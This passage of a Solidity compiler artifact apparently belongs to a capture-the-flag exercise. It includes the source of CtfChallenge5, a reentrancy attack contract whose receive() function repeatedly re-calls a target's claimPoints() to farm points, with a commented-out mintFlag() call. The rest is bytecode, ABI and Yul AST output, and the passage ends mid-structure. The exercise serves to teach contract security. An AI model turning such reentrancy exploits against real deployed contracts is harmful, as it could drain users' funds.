PUSH1 0x1 SLOAD LT ISZERO PUSH2 0xEC JUMPI PUSH1 0x1 PUSH1 0x0 DUP2 SLOAD DUP1 SWAP3 SWAP2 SWAP1 PUSH2 0x66 SWAP1 PUSH2 0x286 JUMP JUMPDEST SWAP2 SWAP1 POP SSTORE POP PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x4D092C7 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xD3 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0xE7 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xFA JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x108 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x111 PUSH2 0x194 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x11E SWAP2 SWAP1 PUSH2 0x2DD JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x133 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x13C PUSH2 0x19A JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x149 SWAP2 SWAP1 PUSH2 0x2DD JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x15E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x167 PUSH2 0x19F JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x174 SWAP2 SWAP1 PUSH2 0x377 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x189 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x192 PUSH2 0x1C3 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x1 SLOAD DUP2 JUMP JUMPDEST PUSH1 0xB DUP2 JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1 DUP2 SWAP1 SSTORE POP PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x4D092C7 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x233 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x247 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x291 DUP3 PUSH2 0x27C JUMP JUMPDEST SWAP2 POP PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 SUB PUSH2 0x2C3 JUMPI PUSH2 0x2C2 PUSH2 0x24D JUMP JUMPDEST JUMPDEST PUSH1 0x1 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x2D7 DUP2 PUSH2 0x27C JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x2F2 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x2CE JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x33D PUSH2 0x338 PUSH2 0x333 DUP5 PUSH2 0x2F8 JUMP JUMPDEST PUSH2 0x318 JUMP JUMPDEST PUSH2 0x2F8 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x34F DUP3 PUSH2 0x322 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x361 DUP3 PUSH2 0x344 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x371 DUP2 PUSH2 0x356 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x38C PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x368 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH23 0xDC1D39E6FC4C5430E3265F240C0DEB629DD90162A79F69 PUSH13 0xD9FA85F5C72D0564736F6C6343 STOP ADDMOD SHR STOP CALLER ","sourceMap":"65:863:12:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;191:2;534:9;;:18;530:97;;;568:9;;:11;;;;;;;;;:::i;:::-;;;;;;593:9;;;;;;;;;;:21;;;:23;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;530:97;65:863;;;;;;;;;;;;128:24;;;;;;;;;;;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;158:35;;;;;;;;;;;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;94:28;;;;;;;;;;;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;360:94;;;;;;;;;;;;;:::i;:::-;;128:24;;;;:::o;158:35::-;191:2;158:35;:::o;94:28::-;;;;;;;;;;;;:::o;360:94::-;413:1;401:9;:13;;;;424:9;;;;;;;;;;:21;;;:23;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;360:94::o;7:180:14:-;55:77;52:1;45:88;152:4;149:1;142:15;176:4;173:1;166:15;193:77;230:7;259:5;248:16;;193:77;;;:::o;276:233::-;315:3;338:24;356:5;338:24;:::i;:::-;329:33;;384:66;377:5;374:77;371:103;;454:18;;:::i;:::-;371:103;501:1;494:5;490:13;483:20;;276:233;;;:::o;515:118::-;602:24;620:5;602:24;:::i;:::-;597:3;590:37;515:118;;:::o;639:222::-;732:4;770:2;759:9;755:18;747:26;;783:71;851:1;840:9;836:17;827:6;783:71;:::i;:::-;639:222;;;;:::o;867:126::-;904:7;944:42;937:5;933:54;922:65;;867:126;;;:::o;999:60::-;1027:3;1048:5;1041:12;;999:60;;;:::o;1065:142::-;1115:9;1148:53;1166:34;1175:24;1193:5;1175:24;:::i;:::-;1166:34;:::i;:::-;1148:53;:::i;:::-;1135:66;;1065:142;;;:::o;1213:126::-;1263:9;1296:37;1327:5;1296:37;:::i;:::-;1283:50;;1213:126;;;:::o;1345:146::-;1415:9;1448:37;1479:5;1448:37;:::i;:::-;1435:50;;1345:146;;;:::o;1497:171::-;1604:57;1655:5;1604:57;:::i;:::-;1599:3;1592:70;1497:171;;:::o;1674:262::-;1787:4;1825:2;1814:9;1810:18;1802:26;;1838:91;1926:1;1915:9;1911:17;1902:6;1838:91;:::i;:::-;1674:262;;;;:::o"},"gasEstimates":{"creation":{"codeDepositCost":"193600","executionCost":"infinite","totalCost":"infinite"},"external":{"":"178","TARGET()":"329","callCount()":"2407","challenge()":"infinite","startClaim()":"infinite"}},"methodIdentifiers":{"TARGET()":"cc1f2afa","callCount()":"4b28f9a2","challenge()":"d2ef7398","startClaim()":"ecbfc077"}},"metadata":"{\"compiler\":{\"version\":\"0.8.28+commit.7893614a\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_challengeAddress\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[],\"name\":\"fallbackCalled\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[],\"name\":\"recieveCalled\",\"type\":\"event\"},{\"stateMutability\":\"nonpayable\",\"type\":\"fallback\"},{\"inputs\":[],\"name\":\"TARGET\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"callCount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"challenge\",\"outputs\":[{\"internalType\":\"contract IChallenge5\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"startClaim\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/CtfChallenge5.sol\":\"CtfChallenge5\"},\"evmVersion\":\"paris\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/CtfChallenge5.sol\":{\"content\":\"// SPDX-License-Identifier: UNLICENSED\\npragma solidity ^0.8.28;\\n\\ncontract CtfChallenge5 {\\n    IChallenge5 public challenge;\\n    uint256 public callCount;\\n    uint256 public constant TARGET = 11;\\n\\n    event recieveCalled();\\n    event fallbackCalled();\\n\\n    constructor(address _challengeAddress) {\\n        challenge = IChallenge5(_challengeAddress);\\n    }\\n\\n    function startClaim() external {\\n        callCount = 0;\\n        challenge.claimPoints();\\n    }\\n\\n    receive() external payable {\\n        // emit recieveCalled();\\n        if (callCount < TARGET) {\\n            callCount++;\\n            challenge.claimPoints();\\n        }\\n    }\\n\\n    fallback() external {\\n        // emit fallbackCalled();       // if (callCount < TARGET) {\\n        //     callCount++;\\n        //     challenge.claimPoints();\\n        // } else if (callCount == TARGET) {\\n        //     callCount++;\\n        //     challenge.mintFlag();\\n        // }\\n    }\\n}\\n\\n\\ninterface IChallenge5 {\\n    function claimPoints() external;\\n    function mintFlag() external;\\n    function resetPoints() external;\\n}\",\"keccak256\":\"0x00fd37fbc9274f742fb67ce55d5671cb15f8c58fa207d26a00bdde719d09e3db\",\"license\":\"UNLICENSED\"}},\"version\":1}","storageLayout":{"storage":[{"astId":5705,"contract":"contracts/CtfChallenge5.sol:CtfChallenge5","label":"challenge","offset":0,"slot":"0","type":"t_contract(IChallenge5)5771"},{"astId":5707,"contract":"contracts/CtfChallenge5.sol:CtfChallenge5","label":"callCount","offset":0,"slot":"1","type":"t_uint256"}],"types":{"t_contract(IChallenge5)5771":{"encoding":"inplace","label":"contract IChallenge5","numberOfBytes":"20"},"t_uint256":{"encoding":"inplace","label":"uint256","numberOfBytes":"32"}}},"userdoc":{"kind":"user","methods":{},"version":1}},"IChallenge5":{"abi":[{"inputs":[],"name":"claimPoints","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"mintFlag","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"resetPoints","outputs":[],"stateMutability":"nonpayable","type":"function"}],"devdoc":{"kind":"dev","methods":{},"version":1},"evm":{"bytecode":{"functionDebugData":{},"generatedSources":[],"linkReferences":{},"object":"","opcodes":"","sourceMap":""},"deployedBytecode":{"functionDebugData":{},"generatedSources":[],"immutableReferences":{},"linkReferences":{},"object":"","opcodes":"","sourceMap":""},"gasEstimates":null,"methodIdentifiers":{"claimPoints()":"04d092c7","mintFlag()":"e00d023f","resetPoints()":"1e4696ae"}},"metadata":"{\"compiler\":{\"version\":\"0.8.28+commit.7893614a\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"name\":\"claimPoints\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"mintFlag\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"resetPoints\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/CtfChallenge5.sol\":\"IChallenge5\"},\"evmVersion\":\"paris\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/CtfChallenge5.sol\":{\"content\":\"// SPDX-License-Identifier: UNLICENSED\\npragma solidity ^0.8.28;\\n\\ncontract CtfChallenge5 {\\n    IChallenge5 public challenge;\\n    uint256 public callCount;\\n    uint256 public constant TARGET = 11;\\n\\n    event recieveCalled();\\n    event fallbackCalled();\\n\\n    constructor(address _challengeAddress) {\\n        challenge = IChallenge5(_challengeAddress);\\n    }\\n\\n    function startClaim() external {\\n        callCount = 0;\\n        challenge.claimPoints();\\n    }\\n\\n    receive() external payable {\\n        // emit recieveCalled();\\n        if (callCount < TARGET) {\\n            callCount++;\\n            challenge.claimPoints();\\n        }\\n    }\\n\\n    fallback() external {\\n        // emit fallbackCalled();       // if (callCount < TARGET) {\\n        //     callCount++;\\n        //     challenge.claimPoints();\\n        // } else if (callCount == TARGET) {\\n        //     callCount++;\\n        //     challenge.mintFlag();\\n        // }\\n    }\\n}\\n\\n\\ninterface IChallenge5 {\\n    function claimPoints() external;\\n    function mintFlag() external;\\n    function resetPoints() external;\\n}\",\"keccak256\":\"0x00fd37fbc9274f742fb67ce55d5671cb15f8c58fa207d26a00bdde719d09e3db\",\"license\":\"UNLICENSED\"}},\"version\":1}","storageLayout":{"storage":[],"types":null},"userdoc":{"kind":"user","methods":{},"version":1}}},"contracts/CtfChallenge6.sol":{"CtfChallenge6":{"abi":[{"inputs":[{"internalType":"address","name":"_challengeAddress","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[],"name":"challenge","outputs":[{"internalType":"contract IChallenge6","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"startMint","outputs":[],"stateMutability":"nonpayable","type":"function"}],"devdoc":{"kind":"dev","methods":{},"version":1},"evm":{"bytecode":{"functionDebugData":{"@_5794":{"entryPoint":null,"id":5794,"parameterSlots":1,"returnSlots":0},"abi_decode_t_address_fromMemory":{"entryPoint":267,"id":null,"parameterSlots":2,"returnSlots":1},"abi_decode_tuple_t_address_fromMemory":{"entryPoint":288,"id":null,"parameterSlots":2,"returnSlots":1},"allocate_unbounded":{"entryPoint":null,"id":null,"parameterSlots":0,"returnSlots":1},"array_dataslot_t_string_storage":{"entryPoint":487,"id":null,"parameterSlots":1,"returnSlots":1},"array_length_t_string_memory_ptr":{"entryPoint":333,"id":null,"parameterSlots":1,"returnSlots":1},"clean_up_bytearray_end_slots_t_string_storage":{"entryPoint":784,"id":null,"parameterSlots":3,"returnSlots":0},"cleanup_t_address":{"entryPoint":226,"id":null,"parameterSlots":1,"returnSlots":1},"cleanup_t_uint160":{"entryPoint":194,"id":null,"parameterSlots":1,"returnSlots":1},"cleanup_t_uint256":{"entryPoint":619,"id":null,"parameterSlots":1,"returnSlots":1},"clear_storage_range_t_bytes1":{"entryPoint":749,"id":null,"parameterSlots":2,"returnSlots":0},"convert_t_uint256_to_t_uint256":{"entryPoint":639,"id":null,"parameterSlots":1,"returnSlots":1},"copy_byte_array_to_storage_from_t_string_memory_ptr_to_t_string_storage":{"entryPoint":925,"id":null,"parameterSlots":2,"returnSlots":0},"divide_by_32_ceil":{"entryPoint":508,"id":null,"parameterSlots":1,"returnSlots":1},"extract_byte_array_length":{"entryPoint":438,"id":null,"parameterSlots":1,"returnSlots":1},"extract_used_part_and_set_length_of_short_byte_array":{"entryPoint":897,"id":null,"parameterSlots":2,"returnSlots":1},"identity":{"entryPoint":629,"id":null,"parameterSlots":1,"returnSlots":1},"mask_bytes_dynamic":{"entryPoint":867,"id":null,"parameterSlots":2,"returnSlots":1},"panic_error_0x22":{"entryPoint":391,"id":null,"parameterSlots":0,"returnSlots":0},"panic_error_0x41":{"entryPoint":344,"id":null,"parameterSlots":0,"returnSlots":0},"prepare_store_t_uint256":{"entryPoint":673,"id":null,"parameterSlots":1,"returnSlots":1},"revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db":{"entryPoint":null,"id":null,"parameterSlots":0,"returnSlots":0},"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b":{"entryPoint":189,"id":null,"parameterSlots":0,"returnSlots":0},"shift_left_dynamic":{"entryPoint":524,"id":null,"parameterSlots":2,"returnSlots":1},"shift_right_unsigned_dynamic":{"entryPoint":854,"id":null,"parameterSlots":2,"returnSlots":1},"storage_set_to_zero_t_uint256":{"entryPoint":725,"id":null,"parameterSlots":2,"returnSlots":0},"update_byte_slice_dynamic32":{"entryPoint":537,"id":null,"parameterSlots":3,"returnSlots":1},"update_storage_value_t_uint256_to_t_uint256":{"entryPoint":683,"id":null,"parameterSlots":3,"returnSlots":0},"validator_revert_t_address":{"entryPoint":244,"id":null,"parameterSlots":1,"returnSlots":0},"zero_value_for_split_t_uint256":{"entryPoint":720,"id":null,"parameterSlots":0,"returnSlots":1}},"generatedSources":[{"ast":{"nativeSrc":"0:6426:14","nodeType":"YulBlock","src":"0:6426:14","statements":[{"body":{"nativeSrc":"47:35:14","nodeType":"YulBlock","src":"47:35:14","statements":[{"nativeSrc":"57:19:14","nodeType":"YulAssignment","src":"57:19:14","value":{"arguments":[{"kind":"number","nativeSrc":"73:2:14","nodeType":"YulLiteral","src":"73:2:14","type":"","value":"64"}],"functionName":{"name":"mload","nativeSrc":"67:5:14","nodeType":"YulIdentifier","src":"67:5:14"},"nativeSrc":"67:9:14","nodeType":"YulFunctionCall","src":"67:9:14"},"variableNames":[{"name":"memPtr","nativeSrc":"57:6:14","nodeType":"YulIdentifier","src":"57:6:14"}]}]},"name":"allocate_unbounded","nativeSrc":"7:75:14","nodeType":"YulFunctionDefinition","returnVariables":[{"name":"memPtr","nativeSrc":"40:6:14","nodeType":"YulTypedName","src":"40:6:14","type":""}],"src":"7:75:14"},{"body":{"nativeSrc":"177:28:14","nodeType":"YulBlock","src":"177:28:14","statements":[{"expression":{"arguments":[{"kind":"number","nativeSrc":"194:1:14","nodeType":"YulLiteral","src":"194:1:14","type":"","value":"0"},{"kind":"number","nativeSrc":"197:1:14","nodeType":"YulLiteral","src":"197:1:14","type":"","value":"0"}],"functionName":{"name":"revert","nativeSrc":"187:6:14","nodeType":"YulIdentifier","src":"187:6:14"},"nativeSrc":"187:12:14","nodeType":"YulFunctionCall","src":"187:12:14"},"nativeSrc":"187:12:14","nodeType":"YulExpressionStatement","src":"187:12:14"}]},"name":"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b","nativeSrc":"88:117:14","nodeType":"YulFunctionDefinition","src":"88:117:14"},{"body":{"nativeSrc":"300:28:14","nodeType":"YulBlock","src":"300:28:14","statements":[{"expression":{"arguments":[{"kind":"number","nativeSrc":"317:1:14","nodeType":"YulLiteral","src":"317:1:14","type":"","value":"0"},{"kind":"number","nativeSrc":"320:1:14","nodeType":"YulLiteral","src":"320:1:14","type":"","value":"0"}],"functionName":{"name":"revert","nativeSrc":"310:6:14","nodeType":"YulIdentifier","src":"310:6:14"},"nativeSrc":"310:12:14","nodeType":"YulFunctionCall","src":"310:12:14"},"nativeSrc":"310:12:14","nodeType":"YulExpressionStatement","src":"310:12:14"}]},"name":"revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db","nativeSrc":"211:117:14","nodeType":"YulFunctionDefinition","src":"211:117:14"},{"body":{"nativeSrc":"379:81:14","nodeType":"YulBlock","src":"379:81:14","statements":[{"nativeSrc":"389:65:14","nodeType":"YulAssignment","src":"389:65:14","value":{"arguments":[{"name":"value","nativeSrc":"404:5:14","nodeType":"YulIdentifier","src":"404:5:14"},{"kind":"number","nativeSrc":"411:42:14","nodeType":"YulLiteral","src":"411:42:14","type":"","value":"0xffffffffffffffffffffffffffffffffffffffff"}],"functionName":{"name":"and","nativeSrc":"400:3:14","nodeType":"YulIdentifier","src":"400:3:14"},"nativeSrc":"400:54:14","nodeType":"YulFunctionCall","src":"400:54:14"},"variableNames":[{"name":"cleaned","nativeSrc":"389:7:14","nodeType":"YulIdentifier","src":"389:7:14"}]}]},"name":"cleanup_t_uint160","nativeSrc":"334:126:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"361:5:14","nodeType":"YulTypedName","src":"361:5:14","type":""}],"returnVariables":[{"name":"cleaned","nativeSrc":"371:7:14","nodeType":"YulTypedName","src":"371:7:14","type":""}],"src":"334:126:14"},{"body":{"nativeSrc":"511:51:14","nodeType":"YulBlock","src":"511:51:14","statements":[{"nativeSrc":"521:35:14","nodeType":"YulAssignment","src":"521:35:14","value":{"arguments":[{"name":"value","nativeSrc":"550:5:14","nodeType":"YulIdentifier","src":"550:5:14"}],"functionName":{"name":"cleanup_t_uint160","nativeSrc":"532:17:14","nodeType":"YulIdentifier","src":"532:17:14"},"nativeSrc":"532:24:14","nodeType":"YulFunctionCall","src":"532:24:14"},"variableNames":[{"name":"cleaned","nativeSrc":"521:7:14","nodeType":"YulIdentifier","src":"521:7:14"}]}]},"name":"cleanup_t_address","nativeSrc":"466:96:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"493:5:14","nodeType":"YulTypedName","src":"493:5:14","type":""}],"returnVariables":[{"name":"cleaned","nativeSrc":"503:7:14","nodeType":"YulTypedName","src":"503:7:14","type":""}],"src":"466:96:14"},{"body":{"nativeSrc":"611:79:14","nodeType":"YulBlock","src":"611:79:14","statements":[{"body":{"nativeSrc":"668:16:14","nodeType":"YulBlock","src":"668:16:14","statements":[{"expression":{"arguments":[{"kind":"number","nativeSrc":"677:1:14","nodeType":"YulLiteral","src":"677:1:14","type":"","value":"0"},{"kind":"number","nativeSrc":"680:1:14","nodeType":"YulLiteral","src":"680:1:14","type":"","value":"0"}],"functionName":{"name":"revert","nativeSrc":"670:6:14","nodeType":"YulIdentifier","src":"670:6:14"},"nativeSrc":"670:12:14","nodeType":"YulFunctionCall","src":"670:12:14"},"nativeSrc":"670:12:14","nodeType":"YulExpressionStatement","src":"670:12:14"}]},"condition":{"arguments":[{"arguments":[{"name":"value","nativeSrc":"634:5:14","nodeType":"YulIdentifier","src":"634:5:14"},{"arguments":[{"name":"value","nativeSrc":"659:5:14","nodeType":"YulIdentifier","src":"659:5:14"}],"functionName":{"name":"cleanup_t_address","nativeSrc":"641:17:14","nodeType":"YulIdentifier","src":"641:17:14"},"nativeSrc":"641:24:14","nodeType":"YulFunctionCall","src":"641:24:14"}],"functionName":{"name":"eq","nativeSrc":"631:2:14","nodeType":"YulIdentifier","src":"631:2:14"},"nativeSrc":"631:35:14","nodeType":"YulFunctionCall","src":"631:35:14"}],"functionName":{"name":"iszero","nativeSrc":"624:6:14","nodeType":"YulIdentifier","src":"624:6:14"},"nativeSrc":"624:43:14","nodeType":"YulFunctionCall","src":"624:43:14"},"nativeSrc":"621:63:14","nodeType":"YulIf","src":"621:63:14"}]},"name":"validator_revert_t_address","nativeSrc":"568:122:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"604:5:14","nodeType":"YulTypedName","src":"604:5:14","type":""}],"src":"568:122:14"},{"body":{"nativeSrc":"759:80:14","nodeType":"YulBlock","src":"759:80:14","statements":[{"nativeSrc":"769:22:14","nodeType":"YulAssignment","src":"769:22:14","value":{"arguments":[{"name":"offset","nativeSrc":"784:6:14","nodeType":"YulIdentifier","src":"784:6:14"}],"functionName":{"name":"mload","nativeSrc":"778:5:14","nodeType":"YulIdentifier","src":"778:5:14"},"nativeSrc":"778:13:14","nodeType":"YulFunctionCall","src":"778:13:14"},"variableNames":[{"name":"value","nativeSrc":"769:5:14","nodeType":"YulIdentifier","src":"769:5:14"}]},{"expression":{"arguments":[{"name":"value","nativeSrc":"827:5:14","nodeType":"YulIdentifier","src":"827:5:14"}],"functionName":{"name":"validator_revert_t_address","nativeSrc":"800:26:14","nodeType":"YulIdentifier","src":"800:26:14"},"nativeSrc":"800:33:14","nodeType":"YulFunctionCall","src":"800:33:14"},"nativeSrc":"800:33:14","nodeType":"YulExpressionStatement","src":"800:33:14"}]},"name":"abi_decode_t_address_fromMemory","nativeSrc":"696:143:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"offset","nativeSrc":"737:6:14","nodeType":"YulTypedName","src":"737:6:14","type":""},{"name":"end","nativeSrc":"745:3:14","nodeType":"YulTypedName","src":"745:3:14","type":""}],"returnVariables":[{"name":"value","nativeSrc":"753:5:14","nodeType":"YulTypedName","src":"753:5:14","type":""}],"src":"696:143:14"},{"body":{"nativeSrc":"922:274:14","nodeType":"YulBlock","src":"922:274:14","statements":[{"body":{"nativeSrc":"968:83:14","nodeType":"YulBlock","src":"968:83:14","statements":[{"expression":{"arguments":[],"functionName":{"name":"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b","nativeSrc":"970:77:14","nodeType":"YulIdentifier","src":"970:77:14"},"nativeSrc":"970:79:14","nodeType":"YulFunctionCall","src":"970:79:14"},"nativeSrc":"970:79:14","nodeType":"YulExpressionStatement","src":"970:79:14"}]},"condition":{"arguments":[{"arguments":[{"name":"dataEnd","nativeSrc":"943:7:14","nodeType":"YulIdentifier","src":"943:7:14"},{"name":"headStart","nativeSrc":"952:9:14","nodeType":"YulIdentifier","src":"952:9:14"}],"functionName":{"name":"sub","nativeSrc":"939:3:14","nodeType":"YulIdentifier","src":"939:3:14"},"nativeSrc":"939:23:14","nodeType":"YulFunctionCall","src":"939:23:14"},{"kind":"number","nativeSrc":"964:2:14","nodeType":"YulLiteral","src":"964:2:14","type":"","value":"32"}],"functionName":{"name":"slt","nativeSrc":"935:3:14","nodeType":"YulIdentifier","src":"935:3:14"},"nativeSrc":"935:32:14","nodeType":"YulFunctionCall","src":"935:32:14"},"nativeSrc":"932:119:14","nodeType":"YulIf","src":"932:119:14"},{"nativeSrc":"1061:128:14","nodeType":"YulBlock","src":"1061:128:14","statements":[{"nativeSrc":"1076:15:14","nodeType":"YulVariableDeclaration","src":"1076:15:14","value":{"kind":"number","nativeSrc":"1090:1:14","nodeType":"YulLiteral","src":"1090:1:14","type":"","value":"0"},"variables":[{"name":"offset","nativeSrc":"1080:6:14","nodeType":"YulTypedName","src":"1080:6:14","type":""}]},{"nativeSrc":"1105:74:14","nodeType":"YulAssignment","src":"1105:74:14","value":{"arguments":[{"arguments":[{"name":"headStart","nativeSrc":"1151:9:14","nodeType":"YulIdentifier","src":"1151:9:14"},{"name":"offset","nativeSrc":"1162:6:14","nodeType":"YulIdentifier","src":"1162:6:14"}],"functionName":{"name":"add","nativeSrc":"1147:3:14","nodeType":"YulIdentifier","src":"1147:3:14"},"nativeSrc":"1147:22:14","nodeType":"YulFunctionCall","src":"1147:22:14"},{"name":"dataEnd","nativeSrc":"1171:7:14","nodeType":"YulIdentifier","src":"1171:7:14"}],"functionName":{"name":"abi_decode_t_address_fromMemory","nativeSrc":"1115:31:14","nodeType":"YulIdentifier","src":"1115:31:14"},"nativeSrc":"1115:64:14","nodeType":"YulFunctionCall","src":"1115:64:14"},"variableNames":[{"name":"value0","nativeSrc":"1105:6:14","node